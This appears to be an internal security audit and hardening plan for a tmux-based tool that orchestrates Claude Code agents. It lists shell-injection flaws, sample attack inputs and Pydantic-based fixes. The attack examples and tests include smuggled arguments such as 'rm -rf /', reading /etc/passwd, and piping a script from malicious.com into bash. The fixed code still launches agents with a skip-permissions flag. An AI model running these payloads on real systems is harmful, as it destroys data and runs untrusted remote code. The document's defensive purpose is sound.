# Security Hardening Task List - Priority Implementation Guide

**Date**: 2025-08-14
**Target**: Senior Developer
**Priority**: CRITICAL - Production Blockers
**Estimated Effort**: 2 weeks focused development

## 🔴 CRITICAL PRIORITY 1: Shell Injection Vulnerabilities

### 1.1 Shell Injection in Orchestrator Spawning (CVSS 9.8)
**File**: `tmux_orchestrator/cli/spawn_orc.py`
**Lines**: 46-77
**Severity**: CRITICAL - Complete system compromise possible

#### **Vulnerable Code**:
```python
# Lines 46-77 in spawn_orc.py
startup_script = f"""#!/bin/bash
# Tmux Orchestrator Startup Script

echo "🚀 Starting Claude Code as Orchestrator..."
echo ""
echo "This will launch Claude Code with autonomous permissions."
echo "Claude will be instructed to load the orchestrator context."
echo ""
echo "Starting in 3 seconds..."
sleep 3

# Create initial instruction file
INSTRUCTION_FILE=$(mktemp /tmp/orc-instruction-XXXXXX.md)
cat > "$INSTRUCTION_FILE" << 'EOF'
Welcome! You are being launched as the Tmux Orchestrator.

Please run the following command to load your orchestrator context:

tmux-orc context show orchestrator

This will provide you with your role, responsibilities, and workflow for managing AI agent teams.
EOF

# Launch Claude with the instruction
{" ".join(claude_cmd)} "$INSTRUCTION_FILE"  # ⚠️ CRITICAL VULNERABILITY

# Clean up
rm -f "$INSTRUCTION_FILE"

# Self-delete this startup script
rm -f "$0"
"""
```

#### **Attack Vector**:
```bash
# Malicious exploitation examples:
tmux-orc spawn orc --profile '; rm -rf / #'
tmux-orc spawn orc --profile '`cat /etc/passwd`'
tmux-orc spawn orc --terminal 'xterm; curl malicious.com/steal.sh | bash'
```

#### **Required Fix**:
```python
import shlex
import subprocess
from pathlib import Path

def create_safe_startup_script(claude_cmd: list[str], instruction_content: str) -> str:
    """Create startup script with proper input sanitization."""

    # 1. Validate each command component
    validated_cmd = []
    for arg in claude_cmd:
        if not isinstance(arg, str):
            raise ValueError(f"Invalid command argument type: {type(arg)}")
        if len(arg) > 1000:  # Reasonable limit
            raise ValueError("Command argument too long")
        if any(char in arg for char in ['\x00', '\n', '\r']):
            raise ValueError("Command argument contains invalid characters")
        # Use shlex.quote for shell-safe escaping
        validated_cmd.append(shlex.quote(arg))

    safe_cmd = " ".join(validated_cmd)

    # 2. Safely escape instruction content
    safe_instruction = shlex.quote(instruction_content)

    return f"""#!/bin/bash
set -euo pipefail  # Exit on error, undefined vars, pipe failures

# Validate command before execution
if [[ -z "{safe_cmd}" ]]; then
    echo "Error: Empty command provided"
    exit 1
fi

# Create instruction file safely
INSTRUCTION_FILE=$(mktemp)
echo {safe_instruction} > "$INSTRUCTION_FILE"

# Launch with validated command
{safe_cmd} "$INSTRUCTION_FILE"

# Clean up
rm -f "$INSTRUCTION_FILE"
"""

# Usage in spawn_orc function:
def spawn_orc(profile: str | None, terminal: str, no_launch: bool, no_gui: bool) -> None:
    # Validate inputs BEFORE using them
    if profile and not re.match(r'^[a-zA-Z0-9_-]+$', profile):
        raise click.BadParameter("Profile name contains invalid characters")

    if terminal != "auto" and not re.match(r'^[a-zA-Z0-9_-]+$', terminal):
        raise click.BadParameter("Terminal name contains invalid characters")

    # Build command safely
    claude_cmd = ["claude"]
    if profile:
        claude_cmd.extend(["--profile", profile])  # No direct interpolation
    claude_cmd.append("--dangerously-skip-permissions")

    instruction_content = """Welcome! You are being launched as the Tmux Orchestrator.

Please run the following command to load your orchestrator context:

tmux-orc context show orchestrator

This will provide you with your role, responsibilities, and workflow for managing AI agent teams."""

    # Create safe script
    startup_script = create_safe_startup_script(claude_cmd, instruction_content)
    # ... rest of function
```

**Testing Requirements**:
```python
def test_shell_injection_prevention():
    """Test that spawn_orc prevents shell injection."""
    malicious_inputs = [
        "; rm -rf / #",
        "`cat /etc/passwd`",
        "$(whoami)",
        "../../etc/passwd",
        "profile; curl malicious.com/steal | bash",
        "' ; echo 'pwned' ; echo '"
    ]

    for malicious_input in malicious_inputs:
        with pytest.raises(click.BadParameter):
            spawn_orc(profile=malicious_input, terminal="auto", no_launch=True, no_gui=False)
```

---

### 1.2 Command Injection in Agent Spawning (CVSS 7.5)
**File**: `tmux_orchestrator/cli/spawn.py`
**Lines**: 102-314
**Severity**: HIGH - Agent compromise possible

#### **Vulnerable Code**:
```python
# Lines 204-217 in spawn.py
daemon_command = [
    sys.executable, "-c",
    f"""
import sys
sys.path.insert(0, '/workspaces/Tmux-Orchestrator')  # ⚠️ Hardcoded path
from tmux_orchestrator.core.monitor import IdleMonitor
from tmux_orchestrator.utils.tmux import TMUXManager

tmux = TMUXManager()
monitor = IdleMonitor(tmux)
monitor._run_monitoring_daemon({interval})  # ⚠️ Direct interpolation
"""
]
```

#### **Attack Vector**:
```bash
# Malicious briefing content
tmux-orc spawn agent test proj:1 --briefing "import os; os.system('rm -rf /')"
tmux-orc spawn agent test proj:1 --working-dir "../../../etc/"
```

#### **Required Fix**:
```python
from pydantic import BaseModel, Field, validator
import re
import os

class AgentSpawnRequest(BaseModel):
    name: str = Field(min_length=1, max_length=50, description="Agent name")
    target: str = Field(regex=r"^[a-zA-Z0-9_-]+:\d+$", description="Target session:window")
    briefing: str = Field(min_length=1, max_length=10000, description="Agent briefing")
    working_dir: Optional[Path] = Field(default=None, description="Working directory")

    @validator('name')
    def validate_name(cls, v):
        if not re.match(r"^[a-zA-Z0-9_-]+$", v):
            raise ValueError("Name contains invalid characters")
        return v

    @validator('briefing')
    def validate_briefing(cls, v):
        # Check for potentially dangerous content
        dangerous_patterns = [
            r'subprocess\.|os\.|exec\(',
            r'__import__\(',
            r'eval\(|exec\(',
            r'open\s*\(',
            r'import\s+(os|subprocess|sys)',
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError(f"Briefing contains dangerous pattern")

        # Check for command injection attempts
        if any(char in v for char in ['`', '$', ';', '|', '&']):
            raise ValueError("Briefing contains shell metacharacters")

        return v

    @validator('working_dir')
    def validate_working_dir(cls, v):
        if v is None:
            return v

        # Resolve path and check it exists
        try:
            resolved = v.resolve()
        except (OSError, RuntimeError):
            raise ValueError(f"Invalid working directory path: {v}")

        if not resolved.exists():
            raise ValueError(f"Working directory does not exist: {resolved}")
        if not resolved.is_dir():
            raise ValueError(f"Working directory is not a directory: {resolved}")

        # Ensure it's within allowed paths (security constraint)
        allowed_prefixes = [
            Path("/workspaces"),
            Path("/tmp"),
            Path.home(),
        ]

        if not any(str(resolved).startswith(str(prefix)) for prefix in allowed_prefixes):
            raise ValueError(f"Working directory not in allowed paths: {resolved}")

        # Check permissions
        if not os.access(resolved, os.R_OK | os.W_OK):
            raise ValueError(f"Insufficient permissions for working directory: {resolved}")

        return resolved

# Updated agent spawning function
def agent(ctx: click.Context, name: str, target: str, briefing: str,
         working_dir: str | None = None, json: bool = False) -> None:
    """Spawn a custom agent with comprehensive security validation."""

    try:
        # Validate all inputs using Pydantic
        spawn_request = AgentSpawnRequest(
            name=name,
            target=target,
            briefing=briefing,
            working_dir=Path(working_dir) if working_dir else None
        )

        # Use validated data for spawning
        result = _spawn_agent_secure(spawn_request, ctx.obj["tmux"])

        if json:
            console.print(json.dumps(result, indent=2))
        else:
            console.print(f"[green]✓ Spawned agent '{spawn_request.name}' securely[/green]")

    except ValidationError as e:
        error_msg = f"Validation failed: {e}"
        if json:
            result = {"success": False, "error": error_msg}
            console.print(json.dumps(result, indent=2))
        else:
            console.print(f"[red]✗ {error_msg}[/red]")
        raise click.Abort()
```

---

## 🔴 CRITICAL PRIORITY 2: Input Validation Framework

### 2.1 Missing Configuration Validation (CVSS 6.1)
**File**: `tmux_orchestrator/core/config.py`
**Lines**: 42-47, 63-75
**Severity**: MEDIUM - Configuration tampering possible

#### **Vulnerable Code**:
```python
# Lines 42-47 in config.py
with open(config_path) as f:
    config_dict: dict[str, Any] = yaml.safe_load(f) or {}
    # Merge with defaults
    merged_config = cls.DEFAULT_CONFIG.copy()
    cls._deep_merge(merged_config, config_dict)  # ⚠️ No validation
    return cls(merged_config)

# Lines 70-74 in config.py
if "TMUX_ORCHESTRATOR_PORT" in os.environ:
    self._config["server"]["port"] = int(os.environ["TMUX_ORCHESTRATOR_PORT"])  # ⚠️ No validation
```

#### **Required Fix**:
```python
from pydantic import BaseModel, Field, validator
import stat

class MonitoringConfig(BaseModel):
    idle_check_interval: int = Field(ge=5, le=3600, default=10)
    notification_cooldown: int = Field(ge=0, le=86400, default=300)

class SecurityConfig(BaseModel):
    max_agents_per_session: int = Field(ge=1, le=50, default=10)
    max_briefing_length: int = Field(ge=100, le=50000, default=10000)
    allowed_working_dirs: list[str] = Field(default_factory=list)

class ServerConfig(BaseModel):
    host: str = Field(default="127.0.0.1")
    port: int = Field(ge=1024, le=65535, default=8000)

    @validator('host')
    def validate_host(cls, v):
        # Only allow localhost/loopback for security
        allowed_hosts = ['127.0.0.1', 'localhost', '0.0.0.0']
        if v not in allowed_hosts:
            raise ValueError(f"Host {v} not allowed for security reasons")
        return v

class ProjectConfig(BaseModel):
    name: Optional[str] = Field(max_length=100, default=None)
    path: Optional[Path] = Field(default=None)

    @validator('path')
    def validate_path(cls, v):
        if v and v.exists():
            # Security check: ensure not world-writable
            stat_info = v.stat()
            if stat_info.st_mode & stat.S_IWOTH:
                raise ValueError("Project path is world-writable (security risk)")
        return v

class Config(BaseModel):
    project: ProjectConfig = Field(default_factory=ProjectConfig)
    monitoring: MonitoringConfig = Field(default_factory=MonitoringConfig)
    security: SecurityConfig = Field(default_factory=SecurityConfig)
    server: ServerConfig = Field(default_factory=ServerConfig)

    @classmethod
    def load_secure(cls, config_path: Optional[Path] = None) -> "Config":
        """Load configuration with comprehensive security validation."""

        if config_path:
            # Validate config file security
            if not cls._validate_config_file_security(config_path):
                raise ValueError("Configuration file has insecure permissions")

            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    config_dict = yaml.safe_load(f)
                return cls.parse_obj(config_dict or {})
            except yaml.YAMLError as e:
                raise ValueError(f"Invalid YAML configuration: {e}")

        # Load from environment with validation
        return cls._load_from_environment()

    @staticmethod
    def _validate_config_file_security(config_path: Path) -> bool:
        """Validate configuration file has secure permissions."""
        try:
            stat_info = config_path.stat()

            # Check file size (prevent DoS)
            if stat_info.st_size > 1024 * 1024:  # 1MB limit
                return False

            # Warn about overly permissive permissions
            if stat_info.st_mode & (stat.S_IRGRP | stat.S_IROTH):
                logger.warning(f"Config file {config_path} is readable by others")

            return True
        except OSError:
            return False
```

---

### 2.2 Team Composition Input Validation (CVSS 6.0)
**File**: `tmux_orchestrator/cli/team_compose.py`
**Lines**: 117-198, 311-418
**Severity**: MEDIUM - Template injection possible

#### **Vulnerable Code**:
```python
# Lines 171-177 in team_compose.py
template_name = Prompt.ask("Template name (or 'list' to see options again)")

if template_name not in templates:
    console.print(f"[red]Template '{template_name}' not found, skipping[/red]")
    continue

# Lines 352-415 in team_compose.py - Direct string interpolation
content = template_content
content = content.replace("{Project Name}", project_name)  # ⚠️ No sanitization
content = content.replace("{Date}", datetime.now().strftime("%Y-%m-%d %H:%M"))
content = content.replace("{PRD Location}", str(prd) if prd else "Not specified")
```

#### **Required Fix**:
```python
import html
import re
from typing import Dict, Any

class TeamCompositionValidator:
    """Validates team composition inputs for security."""

    @staticmethod
    def validate_project_name(name: str) -> str:
        """Validate project name for security."""
        if not re.match(r'^[a-zA-Z0-9_-]+$', name):
            raise ValueError("Project name contains invalid characters")
        if len(name) > 50:
            raise ValueError("Project name too long")
        return name

    @staticmethod
    def validate_template_name(name: str, available_templates: Dict[str, Any]) -> str:
        """Validate template name to prevent path traversal."""
        # Normalize and validate
        name = name.strip().lower()
        if not re.match(r'^[a-zA-Z0-9_-]+$', name):
            raise ValueError("Template name contains invalid characters")

        if name not in available_templates:
            available = list(available_templates.keys())
            raise ValueError(f"Template '{name}' not found. Available: {available}")

        return name

    @staticmethod
    def sanitize_template_content(content: str, replacements: Dict[str, str]) -> str:
        """Safely replace template placeholders."""

        # Sanitize all replacement values
        safe_replacements = {}
        for key, value in replacements.items():
            # HTML escape to prevent injection
            safe_value = html.escape(str(value))
            # Remove potentially dangerous characters
            safe_value = re.sub(r'[<>"\']', '', safe_value)
            safe_replacements[key] = safe_value

        # Perform safe replacements
        result = content
        for placeholder, safe_value in safe_replacements.items():
            result = result.replace(f"{{{placeholder}}}", safe_value)

        return result

# Updated team composition functions
def compose(project_name: str, prd: str | None, interactive: bool, template: str | None) -> None:
    """Compose team with security validation."""

    # Validate project name
    try:
        validated_project = TeamCompositionValidator.validate_project_name(project_name)
    except ValueError as e:
        console.print(f"[red]✗ {e}[/red]")
        raise click.Abort()

    # ... rest of function with validation
```

---

## 🟡 HIGH PRIORITY 3: Path Traversal and File Security

### 3.1 Hardcoded Path Dependencies (CVSS 4.0)
**Files**: Multiple files with hardcoded paths
**Lines**: Various
**Severity**: LOW - Deployment inflexibility

#### **Affected Files**:
```python
# tmux_orchestrator/core/monitor.py:94
project_dir = Path("/workspaces/Tmux-Orchestrator/.tmux_orchestrator")

# tmux_orchestrator/utils/claude_interface.py:11
PROJECT_DIR = Path("/workspaces/Tmux-Orchestrator/.tmux_orchestrator")

# tmux_orchestrator/cli/team_compose.py:72
project_dir = Path.home() / "workspaces" / "Tmux-Orchestrator" / ".tmux_orchestrator"

# tmux_orchestrator/core/daemon_supervisor.py:23
project_dir = Path("/workspaces/Tmux-Orchestrator/.tmux_orchestrator")
```

#### **Required Fix**:
Create centralized path management (as detailed in Technical Debt report)

---

## 📋 Implementation Checklist

### **Week 1: Critical Shell Injection Fixes**
- [ ] **Day 1-2**: Fix `spawn_orc.py` shell injection with `shlex.quote()`
- [ ] **Day 3-4**: Implement agent spawning validation with Pydantic
- [ ] **Day 5**: Add comprehensive security test cases

### **Week 2: Input Validation Framework**
- [ ] **Day 1-2**: Implement configuration validation with Pydantic schemas
- [ ] **Day 3-4**: Add team composition input sanitization
- [ ] **Day 5**: Security audit and penetration testing

### **Testing Requirements**
- [ ] Shell injection prevention tests for all user inputs
- [ ] Input validation tests with malicious payloads
- [ ] Configuration security tests with various attack vectors
- [ ] End-to-end security testing with real attack scenarios

### **Documentation Requirements**
- [ ] Security testing guide for developers
- [ ] Input validation patterns documentation
- [ ] Security review checklist for new features

## 🎯 Success Criteria

1. **Zero shell injection vulnerabilities** - All user inputs properly escaped
2. **Comprehensive input validation** - All user-provided data validated
3. **Secure configuration handling** - Schema validation and permission checks
4. **Automated security testing** - Pre-commit hooks catch security issues
5. **Security audit clean** - External security review passes

**Estimated Total Effort**: 10-12 developer days for complete security hardening

This task list provides the concrete, actionable details needed for the Senior Developer to systematically eliminate all critical security vulnerabilities.
